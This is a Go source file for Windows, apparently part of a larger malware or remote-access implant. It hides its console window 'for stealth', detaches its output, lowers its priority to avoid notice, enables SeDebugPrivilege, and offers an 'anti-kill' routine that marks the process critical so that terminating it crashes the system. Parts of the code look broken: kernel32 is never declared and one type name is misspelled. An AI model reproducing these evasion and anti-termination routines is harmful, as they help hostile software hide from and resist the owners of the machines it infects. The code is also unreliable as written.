//go:build windows
// +build windows

package main

import (
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32               = windows.NewLazySystemDLL("user32.dll")
	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	procShowWindow       = user32.NewProc("ShowWindow")
	procFreeConsole      = kernel32.NewProc("FreeConsole")
)

const (
	SW_HIDE            = 0
	SW_SHOW            = 5
	CREATE_NO_WINDOW   = 0x08000000
	DETACHED_PROCESS   = 0x00000008
)

// init is called automatically before main()
func init() {
	// Hide the console window for stealth (unless in debug mode)
	if !DebugMode {
		hideConsoleWindow()
	}
	
	// Set process to run in background (detach from parent)
	detachFromParent()
}

// hideConsoleWindow hides the console window
func hideConsoleWindow() {
	// Get the console window handle
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		// Hide the console window
		procShowWindow.Call(hwnd, SW_HIDE)
	}
}

// showConsoleWindow shows the console window (for debugging)
func showConsoleWindow() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		procShowWindow.Call(hwnd, SW_SHOW)
	}
}

// freeConsole detaches from the console completely
func freeConsole() {
	procFreeConsole.Call()
}

// detachFromParent detaches the process from its parent
func detachFromParent() {
	// On Windows, redirect stdin/stdout/stderr to NUL device
	// This prevents blocking parent terminal and hides output
	devNull, err := os.OpenFile("NUL", os.O_RDWR, 0)
	if err == nil {
		os.Stdin = devNull
		os.Stdout = devNull
		os.Stderr = devNull
	}
}

// SetProcessPriority sets the process priority to below normal for stealth
func SetProcessPriority() error {
	handle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	
	// Set to BELOW_NORMAL_PRIORITY_CLASS (0x4000)
	return windows.SetPriorityClass(handle, 0x4000)
}

// MakeProcessCritical makes the process critical (BSoD on termination - use with caution!)
// This is an advanced anti-kill technique
func MakeProcessCritical() error {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procRtlSetProcessIsCritical := ntdll.NewProc("RtlSetProcessIsCritical")
	
	var bNew uint32 = 1
	var bOld uint32 = 0
	var bNeedScb uint32 = 0
	
	ret, _, _ := procRtlSetProcessIsCritical.Call(
		uintptr(bNew),
		uintptr(unsafe.Pointer(&bOld)),
		uintptr(bNeedScb),
	)
	
	if ret != 0 {
		return windows.Errno(ret)
	}
	return nil
}

// CreateMutex creates a named mutex to prevent multiple instances
func CreateMutex(name string) (windows.Handle, error) {
	mutexName, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	
	mutex, err := windows.CreateMutex(nil, false, mutexName)
	if err != nil {
		return 0, err
	}
	
	// Check if mutex already exists
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		windows.CloseHandle(mutex)
		return 0, windows.ERROR_ALREADY_EXISTS
	}
	
	return mutex, nil
}

// EnableDebugPrivilege enables SeDebugPrivilege for the current process
func EnableDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()
	
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
	if err != nil {
		return err
	}
	
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}
	
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}
